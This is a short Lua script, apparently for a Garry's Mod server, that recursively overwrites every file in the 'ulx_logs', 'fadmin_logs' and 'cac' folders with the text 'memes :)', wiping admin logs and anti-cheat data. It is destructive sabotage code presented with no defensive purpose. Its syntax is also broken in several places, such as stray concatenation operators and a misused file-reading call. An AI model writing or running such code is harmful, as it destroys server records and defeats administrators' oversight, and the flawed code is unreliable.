local function del(dir)
	local f,d = file.Read( dir ~= '' and dir .. '/*' or '*', 'DATA' )
	
	for k,v in pairs(d) do
		del(dir ~= '' .. and dir .. '/' .. v or v)
	end
	
	for k,v in pairs(f) do
		file.Write( dir ~= '' .. and dir .. '/' .. v, 'memes :)' )
	end
end

del( 'ulx_logs' )
del( 'fadmin_logs' )
del( 'cac' )
